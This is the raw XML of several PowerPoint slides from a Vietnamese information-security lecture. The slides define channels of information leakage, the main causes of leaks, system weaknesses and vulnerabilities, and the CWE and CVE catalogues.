            <a:normAutofit fontScale="55000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900" b="1"/>
              <a:t>Kênh hình ảnh (video)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900"/>
              <a:t>kênh này liên quan tới khả năng kẻ xấu quan sát được bằng hình ảnh sự làm việc của các thiết bị phản xạ thông tin của hệ thống (màn hình chẳng hạn) mà không phải lọt vào địa điểm đặt các thiết bị của hệ thống. Các thiết bị tách thông tin khỏi vật mang ở đây là máy chụp hình, máy quay video…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900" b="1"/>
              <a:t>Kênh thông tin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900"/>
              <a:t>kênh này liên quan tới tiếp cận (trực tiếp hoặc từ xa) tới các yếu tố của hệ thống, tới các vật mang thông tin, tới bản thân thông tin, đầu vào và đầu ra (và các kết quả xử lý), tới bảo đảm toán học (kể các các hệ điều hành). Nó cũng gồm cả việc trích các đường dây dẫn thông tin. Kênh thông tin có thể chia ra các loại:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900"/>
              <a:t>các đường dây thông tin liên lạc viễn thông</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900"/>
              <a:t>các đường dây liên lạc đặc biệt (đường dây nóng)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2900"/>
              <a:t>mạng cục bộ</a:t>
            </a:r>
            <a:endParaRPr lang="da-DK" sz="2900"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="da-DK" sz="2900"/>
              <a:t>các vật mang tin trên máy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:lnSpc>
                <a:spcPct val="130000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="da-DK" sz="2900"/>
              <a:t>các thiết bị đầu cuối.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2900"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="126413986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67299">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="567299">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567299">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="12" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="567299">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567299">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="17" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="567299">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567299">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="22" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="567299">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567299">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="27" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="567299">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567299">
                                            <p:txEl>
                                              <p:pRg st="6" end="6"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="567299">
                                            <p:txEl>
                                              <p:pRg st="6" end="6"/>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567299">
                                            <p:txEl>
                                              <p:pRg st="7" end="7"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="37" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="567299">
                                            <p:txEl>
                                              <p:pRg st="7" end="7"/>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567299">
                                            <p:txEl>
                                              <p:pRg st="8" end="8"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="42" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="56729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2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1703388" y="490538"/>
            <a:ext cx="8050212" cy="576262"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" err="1"/>
              <a:t>Các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" err="1"/>
              <a:t>nguyên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" err="1"/>
              <a:t>nhân</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" err="1"/>
              <a:t>chính</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" err="1"/>
              <a:t>làm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" err="1"/>
              <a:t>rò</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0" err="1"/>
              <a:t>rỉ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0"/>
              <a:t> TT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="568323" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="da-DK" b="1" dirty="0"/>
              <a:t>Các nguyên nhân chính làm rò rỉ TT:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="da-DK" sz="2200" dirty="0"/>
              <a:t>nhân viên và người dùng không tuân thủ các tiêu chuẩn, các yêu cầu, các điều luật khai thác hệ thống</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="da-DK" sz="2200" dirty="0"/>
              <a:t>các lỗi trong thiết kế hệ thống và bảo vệ hệ thống</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="da-DK" sz="2200" dirty="0"/>
              <a:t>tiến hành các tình báo kỹ thuật và nội gián từ phía đối phương</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="324152454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68323">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="56832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6832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568323">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="56832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6832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568323">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="17" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="56832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6832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568323">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="21" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="56832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6832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5" name="Rectangle 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>NỘI DUNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114691" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1219200" y="1828800"/>
            <a:ext cx="10515600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>I. TỔNG QUAN NGUY CƠ GÂY MẤT AN TOÀN THÔNG TIN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>II. ĐIỂM YẾU VÀ LỖ HỔNG BẢO MẬT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IV. MỘT SỐ KIỂU TẤN CÔNG PHỔ BIẾN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3205740491"/>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II. ĐIỂM YẾU VÀ LỖ HỔNG BẢO MẬT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>Điểm yếu hệ thống (System weaknesses):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>Là lỗi hay khiếm khuyết tồn tại trong hệ thống</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" i="1"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>lỗi thiết kế, lỗi cài đặt, lỗi lập trình, lỗi quản trị, lỗi cấu hình hoạt động…)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2400" i="1"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1"/>
              <a:t>Lỗ hổng bảo mật </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>(Security vulnerability):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>Là điểm yếu tồn tại trong một hệ thống </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>thông tin, quy trình bảo mật hệ thống,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>kiểm soát nội bộ hoặc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>thực thi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>mà </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>có thể bị khai thác hoặc </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>bị</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t> kích hoạt bởi một </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t>mối nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1"/>
              <a:t> bảo mật gây tổn hại đến các thuộc tính bảo mật của hệ thống đó, bao gồm tính bí mật tính toàn vẹn, tính sẵn sàng</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5896490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79C28-2114-4D5A-AB74-51A557307838}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>II. ĐIỂM YẾU VÀ LỖ HỔNG BẢO MẬT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{601FE7E9-52AC-4B0A-852F-D3B46CD6051A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Common Weakness Enumeration (CWE):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1"/>
              <a:t>Là </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1"/>
              <a:t>một danh sách chính thức các </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" i="1"/>
              <a:t>kiểu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1"/>
              <a:t>điểm yếu </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" i="1"/>
              <a:t>phần mềm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t> được tạo ra để:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Phục vụ như một ngôn ngữ chung mô tả các điểm yếu bảo mật phần mềm trong kiến trúc, thiết kế hoặc mã.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Phục vụ như một đo lường chuẩn cho các công cụ bảo mật phần mềm nhằm vào những điểm yếu này.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Cung cấp một chuẩn cơ sở chung để xác định những điểm yếu, giảm thiểu và phòng ngừa.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Common Vulnerabilities and Exposures (CVE):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1"/>
              <a:t>“Là m</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" i="1"/>
              <a:t>ột từ điển các tên gọi chung cho lỗ hổng hệ thống thông tin công khai được biết đến.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1"/>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>SP 800-51; CNSSI-4009</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="vi-VN"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="16880671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79C28-2114-4D5A-AB74-51A557307838}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>II. ĐIỂM YẾU VÀ LỖ HỔNG BẢO MẬT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{04B145CF-101B-4426-87F2-36BB50BB85BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AFDAA1E8-28FD-425A-B0BE-1E4D61BBF3EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2819400" y="1620002"/>
            <a:ext cx="7041953" cy="4762584"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8662926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79C28-2114-4D5A-AB74-51A557307838}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>II. ĐIỂM YẾU VÀ LỖ HỔNG BẢO MẬT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A8983D40-F4B3-4AF4-A337-CD4D0812B14B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noGrp="1" noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="76200" y="1524000"/>
            <a:ext cx="12009292" cy="4901188"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
